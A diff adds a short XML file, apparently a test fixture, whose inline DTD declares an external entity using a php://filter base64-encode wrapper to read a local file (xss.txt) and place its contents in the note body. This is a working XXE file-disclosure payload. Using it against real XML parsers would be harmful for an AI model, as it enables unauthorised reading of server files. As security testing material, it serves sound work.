@@ -1,0 +1,18 @@
+<?xml version="1.0"?>
+<!DOCTYPE note [
+  <!ELEMENT note (to,from,heading,body)>
+  <!ELEMENT to      (#PCDATA)>
+  <!ELEMENT from    (#PCDATA)>
+  <!ELEMENT heading (#PCDATA)>
+  <!ELEMENT body    (#PCDATA)>
+  <!ENTITY node SYSTEM 'php://filter/read=convert.base64-encode/resource=xss.txt'>
+]>
+<note>
+  <to>George</to>
+  <from>John</from>
+  <heading>Reminder</heading>
+  <body> &node; </body>
+
+</note>
+
+
